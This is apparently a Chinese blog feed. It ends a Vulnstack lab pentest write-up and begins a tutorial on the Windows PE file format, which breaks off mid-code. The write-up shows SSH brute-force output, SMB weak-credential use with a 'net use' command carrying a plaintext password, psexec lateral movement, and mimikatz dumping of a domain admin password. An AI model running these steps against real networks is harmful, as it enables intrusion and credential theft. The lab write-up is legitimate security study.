 title:Home已完成 16/18 [-] ssh 192.168.93.100:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.100:22 root Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.100:22 admin admin1 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.120:22 admin a11111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 18/18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先整理一下，93段有哪些机子</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">192.168.93.10 Windows Server 2012 R2192.168.93.20 win2008192.168.93.30 win7192.168.93.100 centos 我们所在的位置192.168.93.120 linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fscan扫出一个 mysql 弱口令 <code>root:123</code>，是120那台机子</p><h1 id="ew搭建socks5代理"><a href="#ew搭建socks5代理" class="headerlink" title="ew搭建socks5代理"></a>ew搭建socks5代理</h1><p><img src="/Rxi134_FILE/014ea430e8b41de1c5787eb35353ce0d_MD5.jpeg"></p><p>再利用proxfiler实现全局代理<br><img src="/Rxi134_FILE/8570d52d14d969703d275a881a58b406_MD5.jpeg"></p><h1 id="120备份服务器"><a href="#120备份服务器" class="headerlink" title="120备份服务器"></a>120备份服务器</h1><p>navicat连接上数据库<br><img src="/Rxi134_FILE/8c6124efb27613eb95e74468e7f28b90_MD5.jpeg"><br>数据库完全一样，这有可能是个备份服务器<br><img src="/Rxi134_FILE/d80b26776f729e5e972fb3da354c3d06_MD5.jpeg"></p><p>尝试用centos的密码ssh上去，被拒绝，照着原来的写马就行，这里就不再重复了</p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="尝试永恒之蓝"><a href="#尝试永恒之蓝" class="headerlink" title="尝试永恒之蓝"></a>尝试永恒之蓝</h2><p>这三个windows机器都开了445，给msf加一段session路由，扫这三个windows机器<br><img src="/Rxi134_FILE/99886acb32e07f00ecc70b94fe1ed86f_MD5.jpeg"><br><img src="/Rxi134_FILE/0cafa142dcd00f1f7fd4d90e1f4e8f14_MD5.jpeg"><br>啥都没有</p><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul><li><p>10机器 - Windows Server 2012 R2</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped88/tcp    open  tcpwrapped110/tcp   open  tcpwrapped135/tcp   open  tcpwrapped139/tcp   open  tcpwrapped389/tcp   open  tcpwrapped445/tcp   open  tcpwrapped Windows Server 2012 R2 Datacenter 9600 tcpwrapped464/tcp   open  tcpwrapped593/tcp   open  tcpwrapped636/tcp   open  tcpwrapped3268/tcp  open  tcpwrapped3269/tcp  open  tcpwrapped49155/tcp open  tcpwrapped49157/tcp open  tcpwrapped49158/tcp open  tcpwrapped49159/tcp open  tcpwrapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>20机器 - win2008</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE      VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2580/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found110/tcp   open  tcpwrapped135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Windows Server (R) 2008 Datacenter 6003 Service Pack 2 microsoft-ds (workgroup: TEST)1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 10.00.1600.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Issuer: commonName=SSL_Self_Signed_Fallback| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2019-12-15T05:29:23| Not valid after:  2049-12-15T05:29:23| MD5:   53e9:ab09:d053:84ac:5740:c08b:c93a:e843|_SHA-1: a6a9:c4bd:6d50:a57c:0bec:ad38:5766:7032:0965:33e6|_ssl-date: 2024-10-04T11:53:59+00:00; 0s from scanner time.| ms-sql-ntlm-info:|   192.168.93.20\MSSQLSERVER:|     Target_Name: TEST|     NetBIOS_Domain_Name: TEST|     NetBIOS_Computer_Name: WIN2008|     DNS_Domain_Name: test.org|     DNS_Computer_Name: win2008.test.org|     DNS_Tree_Name: test.org|_    Product_Version: 6.0.6003| ms-sql-info:|   192.168.93.20\MSSQLSERVER:|     Instance name: MSSQLSERVER|     Version:|       name: Microsoft SQL Server 2008 RTM|       number: 10.00.1600.00|       Product: Microsoft SQL Server 2008|       Service pack level: RTM|       Post-SP patches applied: false|     TCP port: 1433|_    Clustered: false2383/tcp  open  ms-olap4?49152/tcp open  msrpc        Microsoft Windows RPC49153/tcp open  msrpc        Microsoft Windows RPC49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49156/tcp open  msrpc        Microsoft Windows RPC49158/tcp open  msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>30机器 - win7</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE25/tcp    open  smtp110/tcp   open  pop3135/tcp   open  msrpc139/tcp   open  netbios-ssn445/tcp   open  microsoft-ds49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49163/tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>存在域 test.org</p><p>这里我还试着看看smb有没有匿名登录，不过都不行</p><h2 id="smb弱口令爆破"><a href="#smb弱口令爆破" class="headerlink" title="smb弱口令爆破"></a>smb弱口令爆破</h2><p>看wp说是win7和win2008的SMB是弱口令<code>administrator:123qwe!ASD</code></p><p>我就懒得爆了，直接用</p><h2 id="psexec-拿下win7、win2008"><a href="#psexec-拿下win7、win2008" class="headerlink" title="psexec 拿下win7、win2008"></a>psexec 拿下win7、win2008</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:123qwe!ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>挂载C盘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use Z: <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30<span class="token punctuation">\</span>c$ /user:administrator 123qwe<span class="token operator">!</span>ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/923db79b42190219ed5eaeaaa4807ee1_MD5.jpeg"></p><p>利用pstools远程连接到win7<br><img src="/Rxi134_FILE/43021cdda9beb03742dba4fc11c39e22_MD5.jpeg"></p><p>利用pstools远程连接到win2008，但是使用pstools是失败的，不知道为啥，使用msf成功了<br><img src="/Rxi134_FILE/b28d4365efa7d86fe1aa9559802139bf_MD5.jpeg"><br><img src="/Rxi134_FILE/e8747a6b72a98571d26cce60f992ee20_MD5.jpeg"></p><p><img src="/Rxi134_FILE/cd1a543929d7096b0f50fab14f6a4357_MD5.jpeg"></p><h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h2><p>win7：直接上传mimikatz，没抓到域用户<br><img src="/Rxi134_FILE/e9d18372c2df207195eab95b63d653fc_MD5.jpeg"></p><p>win2008：meterpreter自带kiwi模块，导入后抓取密码，得到域控<code>Administrator:zxcASDqw123!!</code><br><img src="/Rxi134_FILE/ef253f78bf8f604afc9a0a0e1ce7c93c_MD5.jpeg"></p><h2 id="登录域控"><a href="#登录域控" class="headerlink" title="登录域控"></a>登录域控</h2><p><img src="/Rxi134_FILE/e6307a2bba195460de3771908d80f6bf_MD5.jpeg"><br><img src="/Rxi134_FILE/350745b6490ea82aff33c210c8763305_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.Portable Executable Format 可移植可执行格式</title>
      <link href="/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/"/>
      <url>/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><strong>Portable Executable (PE)</strong> 是 Windows 系统上可执行文件的文件格式。PE 文件扩展名的几个示例包括 <code>.exe</code>、<code>.dll</code>、<code>.sys</code> 和 <code>.scr</code>。本模块讨论 PE 文件的结构，这对于构建或逆向工程恶意软件非常重要。</p><p>请注意，本模块及未来的模块将经常互换使用“可执行文件”（例如 EXE、DLL）和“镜像”（Images）来指代这些文件。</p><h1 id="PE结构"><a href="#PE结构" class="headerlink" title="PE结构"></a>PE结构</h1><p>下图展示了一个简化的 <strong>Portable Executable (PE)</strong> 结构。图中显示的每个头部都被定义为一个数据结构，该结构包含关于 PE 文件的信息。本模块将详细解释每个数据结构。<br><img src="/Rxi134_FILE/4671b85da7b3108123c5f23d8748a504_MD5.jpeg"></p><p><img src="/Rxi134_FILE/07427b54f2cd6658fb90b65947539444_MD5.jpeg"></p><h2 id="DOS-头-IMAGE-DOS-HEADER-）"><a href="#DOS-头-IMAGE-DOS-HEADER-）" class="headerlink" title="DOS 头 (IMAGE_DOS_HEADER)）"></a>DOS 头 (IMAGE_DOS_HEADER)）</h2><p>PE 文件的第一个头部总是以两个字节开头，分别是 <code>0x4D</code> 和 <code>0x5A</code>，通常称为 **<code>MZ</code>**。这两个字节代表 DOS 头部的签名，用于确认正在解析或检查的文件是一个有效的 PE 文件。<br><img src="/Rxi134_FILE/bdd280e07e2ab3e4ea79f3a64f88be18_MD5.jpeg"></p><p><strong>DOS 头部</strong> 是一个数据结构，其定义如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DOS_HEADER</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// DOS .EXE header</span>    WORD   e_magic<span class="token punctuation">;</span>                     <span class="token comment">// Magic number</span>    WORD   e_cblp<span class="token punctuation">;</span>                      <span class="token comment">// Bytes on last page of file</span>    WORD   e_cp<span class="token punctuation">;</span>                        <span class="token comment">// Pages in file</span>    WORD   e_crlc<span class="token punctuation">;</span>                      <span class="token comment">// Relocations</span>    WORD   e_cparhdr<span class="token punctuation">;</span>                   <span class="token comment">// Size of header in paragraphs</span>    WORD   e_minalloc<span class="token punctuation">;</span>                  <span class="token comment">// Minimum extra paragraphs needed</span>    WORD   e_maxalloc<span class="token punctuation">;</span>                  <span class="token comment">// Maximum extra paragraphs needed</span>    WORD   e_ss<span class="token punctuation">;</span>                        <span class="token comment">// Initial (relative) SS value</span>    WORD   e_sp<span class="token punctuation">;</span>                        <span class="token comment">// Initial SP value</span>    WORD   e_csum<span class="token punctuation">;</span>                      <span class="token comment">// Checksum</span>    WORD   e_ip<span class="token punctuation">;</span>                        <span class="token comment">// Initial IP value</span>    WORD   e_cs<span class="token punctuation">;</span>                        <span class="token comment">// Initial (relative) CS value</span>    WORD   e_lfarlc<span class="token punctuation">;</span>                    <span class="token comment">// File address of relocation table</span>    WORD   e_ovno<span class="token punctuation">;</span>                      <span class="token comment">// Overlay number</span>    WORD   e_res<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token comment">// Reserved words</span>    WORD   e_oemid<span class="token punctuation">;</span>                     <span class="token comment">// OEM identifier (for e_oeminfo)</span>    WORD   e_oeminfo<span class="token punctuation">;</span>                   <span class="token comment">// OEM information; e_oemid specific</span>    WORD   e_res2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token comment">// Reserved words</span>    LONG   e_lfanew<span class="token punctuation">;</span>                    <span class="token comment">// Offset to the NT header</span>  <span class="token punctuation">&#125;</span> IMAGE_DOS_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DOS_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体中最重要的成员是 <strong><code>e_magic</code></strong> 和 **<code>e_lfanew</code>**。</p><ul><li><strong><code>e_magic</code></strong> 是一个 2 字节的值，固定值为 <code>0x5A4D</code> 或 <strong>MZ</strong>。</li><li><strong><code>e_lfanew</code></strong> 是一个 4 字节的值，保存 NT 头部的起始偏移量。注意，**<code>e_lfanew</code>** 总是位于偏移量 <code>0x3C</code> 处。</li></ul><h2 id="DOS-存根"><a href="#DOS-存根" class="headerlink" title="DOS 存根"></a>DOS 存根</h2><p>在进入 NT 头部结构之前，有一个 <strong>DOS stub</strong>，这是一个错误消息，打印内容为 “<code>This program cannot be run in DOS mode</code>“（该程序无法在 DOS 模式下运行），当程序在 DOS 模式或 “磁盘操作模式” 下加载时会显示此消息。<br><img src="/Rxi134_FILE/9ee4b3e681f049fd506307b7241a8f30_MD5.jpeg"></p><p>值得注意的是，这个错误消息可以由程序员在编译时更改。虽然这不是 PE 头部的一部分，但了解它是有益的。</p><h2 id="NT-头-IMAGE-NT-HEADERS"><a href="#NT-头-IMAGE-NT-HEADERS" class="headerlink" title="NT 头 (IMAGE_NT_HEADERS)"></a>NT 头 (IMAGE_NT_HEADERS)</h2><p>NT 头部非常重要，因为它包含了另外两个镜像头部：<strong>FileHeader</strong> 和 <strong>OptionalHeader</strong>，这两个头部包含了关于 PE 文件的大量信息。</p><p>与 DOS 头部类似，NT 头部也包含一个用于验证的签名成员。通常，签名元素等于字符串 “PE”，其由 <code>0x50</code> 和 <code>0x45</code> 字节表示。但由于签名是 <code>DWORD</code> 数据类型，签名会表示为 <code>0x50450000</code>，虽然被填充了两个空字节，仍然表示为 “PE”。<br><img src="/Rxi134_FILE/944b333c6cedabdb55da4a43db439843_MD5.jpeg"></p><p>NT 头部可以通过 DOS 头部中的成员 <strong><code>e_lfanew</code></strong> 来访问，如图，0xf0 正是 NT头 的偏移<br><img src="/Rxi134_FILE/33058c354ba66ad27a5820d995f0e148_MD5.jpeg"></p><p>NT 头部的结构会根据机器的架构而有所不同。</p><ul><li>32 位版本：<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>  DWORD                   Signature<span class="token punctuation">;</span>  IMAGE_FILE_HEADER       FileHeader<span class="token punctuation">;</span>  IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>64 位版本：<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS64</span> <span class="token punctuation">&#123;</span>    DWORD                   Signature<span class="token punctuation">;</span>    IMAGE_FILE_HEADER       FileHeader<span class="token punctuation">;</span>    IMAGE_OPTIONAL_HEADER64 OptionalHeader<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS64<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS64<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>唯一的区别在于数据结构 <strong><code>OptionalHeader</code></strong> ，是 <strong><code>IMAGE_OPTIONAL_HEADER32</code></strong> 或 **<code>IMAGE_OPTIONAL_HEADER64</code>**，分别用于 32 位和 64 位架构。</p><h3 id="文件头-IMAGE-FILE-HEADER"><a href="#文件头-IMAGE-FILE-HEADER" class="headerlink" title="文件头 (IMAGE_FILE_HEADER)"></a>文件头 (IMAGE_FILE_HEADER)</h3><p>接下来是可以从之前的 NT 头部数据结构访问的头部：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>  WORD  Machine<span class="token punctuation">;</span>  WORD  NumberOfSections<span class="token punctuation">;</span>  DWORD TimeDateStamp<span class="token punctuation">;</span>  DWORD PointerToSymbolTable<span class="token punctuation">;</span>  DWORD NumberOfSymbols<span class="token punctuation">;</span>  WORD  SizeOfOptionalHeader<span class="token punctuation">;</span>  WORD  Characteristics<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最重要的结构体成员是：</p><ul><li><strong><code>NumberOfSections</code></strong> - PE 文件中的段数量（稍后讨论）。</li><li><strong><code>Characteristics</code></strong> - 指定可执行文件某些属性的标志，比如它是否是动态链接库（DLL）或控制台应用程序。</li><li><strong><code>SizeOfOptionalHeader</code></strong> - 后续可选头部的大小。<br>关于文件头部的更多信息可以在官方文档页面中找到。<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header">official documentation page</a>.</li></ul><h3 id="可选头部-IMAGE-OPTIONAL-HEADER"><a href="#可选头部-IMAGE-OPTIONAL-HEADER" class="headerlink" title="可选头部 (IMAGE_OPTIONAL_HEADER)"></a>可选头部 (IMAGE_OPTIONAL_HEADER)</h3><p>可选头部非常重要，尽管它被称为 “可选” ，但对 PE 文件的执行至关重要。之所以称它为“可选”，是因为某些文件类型没有这个头部。</p><p>可选头部有两个版本，分别用于 32 位和 64 位系统。两个版本的数据结构几乎相同，主要区别在于某些成员的大小。**<code>ULONGLONG</code>** 用于 64 位版本，**<code>DWORD</code>** 用于 32 位版本。此外，32 位版本中有一些在 64 位版本中不存在的成员。</p><ul><li><p>32 位版本</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER</span> <span class="token punctuation">&#123;</span>  WORD                 Magic<span class="token punctuation">;</span>  BYTE                 MajorLinkerVersion<span class="token punctuation">;</span>  BYTE                 MinorLinkerVersion<span class="token punctuation">;</span>  DWORD                SizeOfCode<span class="token punctuation">;</span>  DWORD                SizeOfInitializedData<span class="token punctuation">;</span>  DWORD                SizeOfUninitializedData<span class="token punctuation">;</span>  DWORD                AddressOfEntryPoint<span class="token punctuation">;</span>  DWORD                BaseOfCode<span class="token punctuation">;</span>  DWORD                BaseOfData<span class="token punctuation">;</span>  DWORD                ImageBase<span class="token punctuation">;</span>  DWORD                SectionAlignment<span class="token punctuation">;</span>  DWORD                FileAlignment<span class="token punctuation">;</span>  WORD                 MajorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MinorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MajorImageVersion<span class="token punctuation">;</span>  WORD                 MinorImageVersion<span class="token punctuation">;</span>  WORD                 MajorSubsystemVersion<span class="token punctuation">;</span>  WORD                 MinorSubsystemVersion<span class="token punctuation">;</span>  DWORD                Win32VersionValue<span class="token punctuation">;</span>  DWORD                SizeOfImage<span class="token punctuation">;</span>  DWORD                SizeOfHeaders<span class="token punctuation">;</span>  DWORD                CheckSum<span class="token punctuation">;</span>  WORD                 Subsystem<span class="token punctuation">;</span>  WORD                 DllCharacteristics<span class="token punctuation">;</span>  DWORD                SizeOfStackReserve<span class="token punctuation">;</span>  DWORD                SizeOfStackCommit<span class="token punctuation">;</span>  DWORD                SizeOfHeapReserve<span class="token punctuation">;</span>  DWORD                SizeOfHeapCommit<span class="token punctuation">;</span>  DWORD                LoaderFlags<span class="token punctuation">;</span>  DWORD                NumberOfRvaAndSizes<span class="token punctuation">;</span>  IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>64位版本</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER64</span> <span class="token punctuation">&#123;</span>  WORD                 Magic<span class="token punctuation">;</span>  BYTE                 MajorLinkerVersion<span class="token punctuation">;</span>  BYTE                 MinorLinkerVersion<span class="token punctuation">;</span>  DWORD                SizeOfCode<span class="token punctuation">;</span>  DWORD                SizeOfInitializedData<span class="token punctuation">;</span>  DWORD                SizeOfUninitializedData<span class="token punctuation">;</span>  DWORD                AddressOfEntryPoint<span class="token punctuation">;</span>  DWORD                BaseOfCode<span class="token punctuation">;</span>  ULONGLONG            ImageBase<span class="token punctuation">;</span>  DWORD                SectionAlignment<span class="token punctuation">;</span>  DWORD                FileAlignment<span class="token punctuation">;</span>  WORD                 MajorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MinorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MajorImageVersion<span class="token punctuation">;</span>  WORD                 MinorImageVersion<span class="token punctuation">;</span>  WORD                 MajorSubsystemVersion<span class="token punctuation">;</span>  WORD                 MinorSubsystemVersion<span class="token punctuation">;</span>  DWORD                Win32VersionValue<span class="token punctuation">;</span>  DWORD                SizeOfImage<span class="token punctuation">;</span>  DWORD                SizeOfHeaders<span class="token punctuation">;</span>  DWORD                CheckSum<span class="token punctuation">;</span>  WORD                 Subsystem<span class="token punctuation">;</span>  WORD                 DllCharacteristics<span class="token punctuation">;</span>  ULONGLONG            SizeOfStackReserve<span class="token punctuation">;</span>  ULONGLONG            SizeOfStackCommit<span class="token punctuation">;</span>  ULONGLONG            SizeOfHeapReserve<span class="token punctuation">;</span>  ULONGLONG            SizeOfHeapCommit<span class="token punctuation">;</span>  DWORD                LoaderFlags<span class="token punctuation">;</span>  DWORD                NumberOfRvaAndSizes<span class="token punctuation">;</span>  IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER64<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER64<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>可选头部包含了大量有用的信息。以下是一些常用的结构体成员：</p><ul><li><strong><code>Magic</code></strong> - 描述镜像文件的状态（32 位或 64 位镜像）。</li><li><strong><code>MajorOperatingSystemVersion</code></strong> - 所需操作系统的主要版本号（例如 11, 10）。</li><li><strong><code>MinorOperatingSystemVersion</code></strong> - 所需操作系统的次要版本号（例如 1511, 1507, 1607）。</li><li><strong><code>SizeOfCode</code></strong> - 代码段的大小（稍后讨论）。</li><li><strong><code>AddressOfEntryPoint</code></strong> - 文件的入口点偏移量（通常为 <code>main</code> 函数的偏移）。</li><li><strong><code>BaseOfCode</code></strong> - 代码段起始位置的偏移量。</li><li><strong><code>SizeOfImage</code></strong> - 镜像文件的大小，以字节为单位。</li><li><strong><code>ImageBase</code></strong> - 指定应用程序在执行时要加载到内存中的首选地址。然而，由于 Windows 的内存保护机制（例如地址空间布局随机化，ASLR），很少见到镜像映射到其首选地址，因为 Windows PE 加载器会将文件映射到不同的地址。Windows PE 加载器进行的这种随机分配会在实现未来技术时导致问题，因为某些被认为是常量的地址发生了变化。之后，Windows PE 加载器会通过 PE 重定位来修复这些地址。</li><li><strong><code>DataDirectory</code></strong> - 可选头部中最重要的成员之一。它是一个 <strong><code>IMAGE_DATA_DIRECTORY</code></strong> 的数组，包含 PE 文件中的目录（稍后讨论）。</li></ul><h4 id="数据目录-Data-Directory"><a href="#数据目录-Data-Directory" class="headerlink" title="数据目录 Data Directory"></a>数据目录 Data Directory</h4><p>可以通过可选头的最后一个成员来访问数据目录（Data Directory）。该成员是一个 <code>IMAGE_DATA_DIRECTORY</code> 数据类型的数组，其数据结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DATA_DIRECTORY</span> <span class="token punctuation">&#123;</span>    DWORD   VirtualAddress<span class="token punctuation">;</span>  <span class="token comment">// 虚拟地址</span>    DWORD   Size<span class="token punctuation">;</span>            <span class="token comment">// 大小</span><span class="token punctuation">&#125;</span> IMAGE_DATA_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>数据目录数组的大小由常量 <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES</code> 决定，其值为 16。数组中的每个元素表示一个特定的数据目录，包含了某个 PE 节（section）或数据表（Data Table）的一些数据（即存储 PE 具体信息的地方）。</p><p>可以通过数组的索引来访问特定的数据目录：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_EXPORT</span>          <span class="token expression"><span class="token number">0</span>   </span><span class="token comment">// Export Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_IMPORT</span>          <span class="token expression"><span class="token number">1</span>   </span><span class="token comment">// Import Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_RESOURCE</span>        <span class="token expression"><span class="token number">2</span>   </span><span class="token comment">// Resource Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_EXCEPTION</span>       <span class="token expression"><span class="token number">3</span>   </span><span class="token comment">// Exception Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_SECURITY</span>        <span class="token expression"><span class="token number">4</span>   </span><span class="token comment">// Security Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_BASERELOC</span>       <span class="token expression"><span class="token number">5</span>   </span><span class="token comment">// Base Relocation Table</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_DEBUG</span>           <span class="token expression"><span class="token number">6</span>   </span><span class="token comment">// Debug Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token 